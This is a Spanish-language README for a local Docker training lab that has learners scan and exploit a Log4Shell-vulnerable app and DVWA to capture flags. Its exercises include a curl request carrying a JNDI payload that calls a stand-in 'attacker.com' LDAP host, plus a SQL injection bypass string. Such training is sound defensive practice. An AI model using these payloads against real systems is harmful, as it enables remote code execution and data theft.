
# 🚨 Zero-Day Scanner Lab

## Descripción
Laboratorio diseñado para practicar la detección y explotación de vulnerabilidades críticas recientes, incluyendo Log4Shell y otras CVEs de alto impacto.

## Objetivos de Aprendizaje
- Identificar aplicaciones vulnerables a Log4Shell (CVE-2021-44228)
- Explotar vulnerabilidades web en DVWA
- Usar herramientas de escaneo automatizado (Nuclei, Nmap)
- Comprender el impacto de CVEs críticos

## Servicios Incluidos
- **DVWA**: Aplicación web vulnerable (puerto 8080)
- **Log4Shell App**: Aplicación vulnerable a Log4Shell (puerto 8090)
- **Kali Scanner**: Herramientas de escaneo (SSH puerto 2222)

## Instrucciones de Uso

### 1. Iniciar el Laboratorio
```bash
cd labs/lab-zero-day-scanner
docker-compose up -d
```

### 2. Acceder a los Servicios
- **DVWA**: http://localhost:8080 (admin/password)
- **Log4Shell App**: http://localhost:8090
- **Scanner Tools**: `ssh root@localhost -p 2222`

### 3. Ejercicios Prácticos

#### Ejercicio 1: Log4Shell Detection
```bash
# Conectar al contenedor scanner
docker exec -it zero-day-scanner bash

# Escanear con Nuclei
nuclei -u http://log4shell-vulnerable:8080 -t cves/

# Explotar Log4Shell
curl 'http://log4shell-vulnerable:8080' -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}'
```

#### Ejercicio 2: DVWA SQL Injection
1. Acceder a DVWA
2. Navegar a SQL Injection (Low Security)
3. Probar payload: `1' OR '1'='1' --`
4. Capturar flag en la base de datos

### 4. Flags Esperadas
- `ZERO_DAY{log4shell_rce_success}` - Al explotar Log4Shell exitosamente
- `ZERO_DAY{dvwa_sqli_bypass}` - Al extraer datos vía SQL Injection

### 5. Detener el Laboratorio
```bash
docker-compose down
```

## Recursos Adicionales
- [CVE-2021-44228 Details](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [DVWA Documentation](https://github.com/digininja/DVWA)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)

---
**Desarrollado por @descambiado para BOFA**
